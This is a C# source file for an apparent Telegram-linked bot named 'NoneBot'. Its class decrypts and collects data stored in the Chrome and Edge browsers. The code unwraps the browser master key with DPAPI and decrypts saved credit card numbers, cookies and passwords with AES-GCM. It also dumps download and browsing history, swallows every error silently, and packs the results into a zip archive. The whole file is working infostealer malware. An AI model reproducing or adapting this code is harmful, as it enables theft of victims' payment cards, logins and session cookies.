using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using NoneBot.Common;
using NoneBot.Telegram;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Utilities;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Linq.Expressions;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;

namespace NoneBot.Function.Browsers
{
    public class CChromium
    {
        public Dictionary<string, string> m_hBrowsers = new Dictionary<string, string>();
        public List<string> m_hProfiles = new List<string>();

        public CChromium()
        {
            string strLocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            m_hBrowsers.Add("Google_Chrome", strLocalApplicationData + "\\Google\\Chrome\\User Data"); // 크롬
            m_hBrowsers.Add("Google_Chrome_SXS", strLocalApplicationData + "\\Google\\Chrome SXS\\User Data"); // 크롬 SXS
            m_hBrowsers.Add("Microsoft_Edge", strLocalApplicationData + "\\Microsoft\\Edge\\User Data"); // 엣지
            // Todo: 크로미엄 브라우저 추가 시 딕셔너리에 경로 추가해주세요.

            // 프로파일은 전부 같음.
            m_hProfiles.Add("Default");
            m_hProfiles.Add("Profile 1");
            m_hProfiles.Add("Profile 2");
            m_hProfiles.Add("Profile 3");
            m_hProfiles.Add("Profile 4");
            m_hProfiles.Add("Profile 5");
        }

        public void GetChromiumBrowsersData()
        {
            foreach (var hBrowser in m_hBrowsers)
            {
                if (!Process(hBrowser.Value))
                {
                    continue;
                }
            }

            CreateZIP();
        }

        public bool Process(string strPath)
        {
            byte[] szMasterKey = GetKey(strPath);

            if (szMasterKey == null)
            {
                return false;
            }

            foreach (var hProfile in m_hProfiles)
            {
                try
                {
                    GetCreditCards(strPath + "\\" + hProfile, szMasterKey);
                    GetCookies(strPath + "\\" + hProfile, szMasterKey);
                    GetDownloads(strPath + "\\" + hProfile, szMasterKey);
                    GetWebHistory(strPath + "\\" + hProfile, szMasterKey);
                    GetSavePassword(strPath + "\\" + hProfile, szMasterKey);
                }
                catch (Exception e)
                {

                }
            }

            return true;
        }

        public byte[] GetKey(string strPath)
        {
            string strKeyPath = strPath + "\\" + "Local State";

            if (!System.IO.File.Exists(strKeyPath))
            {
                return null;
            }

            using (StreamReader hStream = System.IO.File.OpenText(strKeyPath))
            {
                using (JsonTextReader hReader = new JsonTextReader(hStream))
                {
                    JObject hJson = (JObject)JToken.ReadFrom(hReader);
                    var szMasterKey = ProtectedData.Unprotect(Convert.FromBase64String(hJson["os_crypt"]["encrypted_key"].ToString()).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);

                    return szMasterKey;
                }
            }
        }

        public void GetCreditCards(string strPath, byte[] szKey)
        {
            string strFullPath = strPath + "\\" + "Web Data";

            if (!System.IO.File.Exists(strFullPath))
            {
                return;
            }

            using (StreamWriter hStreamWriter = File.AppendText("CreditCards.txt"))
            {
                using (SQLiteConnection hConnect = new SQLiteConnection(String.Format("Data Source={0};Version=3;", strFullPath)))
                {
                    hConnect.Open();

                    using (SQLiteCommand hCommand = new SQLiteCommand("select * from credit_cards", hConnect))
                    {
                        using (SQLiteDataReader hReader = hCommand.ExecuteReader())
                        {
                            while (hReader.Read())
                            {
                                try
                                {
                                    string strNameOnCard = hReader["name_on_card"].ToString();
                                    string strExpirationMonth = hReader["expiration_month"].ToString();
                                    string strExpirationYear = hReader["expiration_year"].ToString();
                                    string strCardNumber = Decrypt((byte[])hReader["card_number_encrypted"], szKey);
                                    string strDateModified = hReader["date_modified"].ToString();
                                    string strBillingAddressId = hReader["billing_address_id"].ToString();
                                    string strNickName = hReader["nickname"].ToString();

                                    hStreamWriter.WriteLine(strNameOnCard);
                                    hStreamWriter.WriteLine(strExpirationMonth);
                                    hStreamWriter.WriteLine(strExpirationYear);
                                    hStreamWriter.WriteLine(strCardNumber);
                                    hStreamWriter.WriteLine(strDateModified);
                                    hStreamWriter.WriteLine(strBillingAddressId);
                                    hStreamWriter.WriteLine(strNickName);
                                    hStreamWriter.WriteLine("");
                                }
                                catch (Exception ex)
                                {

                                }
                            }
                        }
                    }
                }

                hStreamWriter.Close();
            }
        }

        public void GetCookies(string strPath, byte[] szKey)
        {
            string strFullPath = strPath + "\\" + "Network\\Cookies";

            if (!System.IO.File.Exists(strFullPath))
            {
                return;
            }
            using (StreamWriter hStreamWriter = File.AppendText("Cookies.txt"))
            {
                using (SQLiteConnection hConnect = new SQLiteConnection(String.Format("Data Source={0};Version=3;", strFullPath)))
                {
                    hConnect.Open();

                    using (SQLiteCommand hCommand = new SQLiteCommand("select * from cookies", hConnect))
                    {
                        using (SQLiteDataReader hReader = hCommand.ExecuteReader())
                        {
                            while (hReader.Read())
                            {
                                try
                                {
                                    string strHostKey = hReader["host_key"].ToString();
                                    string strName = hReader["name"].ToString();
                                    string strEncryptedValue = Decrypt((byte[])hReader["encrypted_value"], szKey);
                                    string _strPath = hReader["path"].ToString();
                                    string strExpiresUTC = hReader["expires_utc"].ToString();

                                    hStreamWriter.WriteLine(strHostKey);
                                    hStreamWriter.WriteLine(strName);
                                    hStreamWriter.WriteLine(strEncryptedValue);
                                    hStreamWriter.WriteLine(_strPath);
                                    hStreamWriter.WriteLine(strExpiresUTC);
                                    hStreamWriter.WriteLine("");
                                }
                                catch (Exception ex)
                                {

                                }
                            }
                        }
                    }
                }

                hStreamWriter.Close();
            }
        }

        public void GetDownloads(string strPath, byte[] szKey)
        {
            string strFullPath = strPath + "\\" + "History";

            if (!System.IO.File.Exists(strFullPath))
            {
                return;
            }

            using (StreamWriter hStreamWriter = File.AppendText("Downloads.txt"))
            {
                using (SQLiteConnection hConnect = new SQLiteConnection(String.Format("Data Source={0};Version=3;", strFullPath)))
                {
                    hConnect.Open();

                    using (SQLiteCommand hCommand = new SQLiteCommand("select * from downloads", hConnect))
                    {
                        using (SQLiteDataReader hReader = hCommand.ExecuteReader())
                        {
                            while (hReader.Read())
                            {
                                try
                                {
                                    string strTargetPath = hReader["target_path"].ToString();
                                    string strTabURL = hReader["tab_url"].ToString();

                                    hStreamWriter.WriteLine(strTargetPath);
                                    hStreamWriter.WriteLine(strTabURL);
                                    hStreamWriter.WriteLine("");
                                }
                                catch (Exception ex)
                                {

                                }
                            }
                        }
                    }
                }

                hStreamWriter.Close();
            }
        }

        public void GetWebHistory(string strPath, byte[] szKey)
        {
            string strFullPath = strPath + "\\" + "History";

            if (!System.IO.File.Exists(strFullPath))
            {
                return;
            }
            using (StreamWriter hStreamWriter = File.AppendText("Urls.txt"))
            {
                using (SQLiteConnection hConnect = new SQLiteConnection(String.Format("Data Source={0};Version=3;", strFullPath)))
                {
                    hConnect.Open();

                    using (SQLiteCommand hCommand = new SQLiteCommand("select * from urls", hConnect))
                    {
                        using (SQLiteDataReader hReader = hCommand.ExecuteReader())
                        {
                            while (hReader.Read())
                            {
                                try
                                {
                                    string strURL = hReader["url"].ToString();
                                    string strTitle = hReader["title"].ToString();
                                    string strLastVisitTime = hReader["last_visit_time"].ToString();

                                    hStreamWriter.WriteLine(strURL);
                                    hStreamWriter.WriteLine(strTitle);
                                    hStreamWriter.WriteLine(strLastVisitTime);
                                    hStreamWriter.WriteLine("");
                                }
                                catch (Exception ex)
                                {

                                }
                            }
                        }
                    }
                }

                hStreamWriter.Close();
            }
        }

        public void GetSavePassword(string strPath, byte[] szKey)
        {
            string strFullPath = strPath + "\\" + "Login Data";

            if (!System.IO.File.Exists(strFullPath))
            {
                return;
            }
            using (StreamWriter hStreamWriter = File.AppendText("Logins.txt"))
            {
                using (SQLiteConnection hConnect = new SQLiteConnection(String.Format("Data Source={0};Version=3;", strFullPath)))
                {
                    hConnect.Open();

                    using (SQLiteCommand hCommand = new SQLiteCommand("select * from logins", hConnect))
                    {
                        using (SQLiteDataReader hReader = hCommand.ExecuteReader())
                        {
                            while (hReader.Read())
                            {
                                try
                                {
                                    string strURL = hReader["origin_url"].ToString();
                                    string strID = hReader["username_value"].ToString();
                                    string strPassword = Decrypt((byte[])hReader["password_value"], szKey);

                                    hStreamWriter.WriteLine(strURL);
                                    hStreamWriter.WriteLine(strID);
                                    hStreamWriter.WriteLine(strPassword);
                                    hStreamWriter.WriteLine("");
                                }
                                catch (Exception ex)
                                {

                                }
                            }
                        }
                    }
                }

                hStreamWriter.Close();
            }
        }

        public string Decrypt(byte[] szEncryptedBytes, byte[] szKey)
        {
            string strResult = string.Empty;

            if (Encoding.Default.GetString(szEncryptedBytes).StartsWith("v10") || Encoding.Default.GetString(szEncryptedBytes).StartsWith("v11"))
            {
                byte[] szIV = szEncryptedBytes.Skip(3).Take(12).ToArray();
                byte[] szPayload = szEncryptedBytes.Skip(15).Take(szEncryptedBytes.Length - 3 - szIV.Length).ToArray();

                try
                {
                    GcmBlockCipher hCipher = new GcmBlockCipher(new AesEngine());
                    AeadParameters hParameters = new AeadParameters(new KeyParameter(szKey), 128, szIV, null);

                    hCipher.Init(false, hParameters);
                    byte[] szPlainBytes = new byte[hCipher.GetOutputSize(szPayload.Length)];
                    Int32 nReturnLength = hCipher.ProcessBytes(szPayload, 0, szPayload.Length, szPlainBytes, 0);
                    hCipher.DoFinal(szPlainBytes, nReturnLength);

                    strResult = Encoding.UTF8.GetString(szPlainBytes).TrimEnd("\r\n\0".ToCharArray());
                }
                catch (Exception ex)
                {
                    return CErrorCode.DECRYPTFAIL;
                }
            }
            else
            {
                strResult = Encoding.UTF8.GetString(ProtectedData.Unprotect(szEncryptedBytes, null, DataProtectionScope.CurrentUser));
            }

            return strResult;
        }

        public void CreateZIP()
        {
            Directory.CreateDirectory("WebInfo");

            List<string> hFileNameList = new List<string>
            {
                "CreditCards.txt",
                "Cookies.txt",
                "Downloads.txt",
                "Urls.txt",
                "Logins.txt",
            };

            foreach (var strFileName in hFileNameList)
            {
                var strSourceFile = Path.Combine("", strFileName);
                var strDestFile = Path.Combine("WebInfo", strFileName);

                File.Copy(strSourceFile, strDestFile, true);
                File.Delete(strFileName);
            }


            ZipFile.CreateFromDirectory("WebInfo", "WebInfo.zip");

            Directory.Delete("WebInfo", true);
        }
    }
}
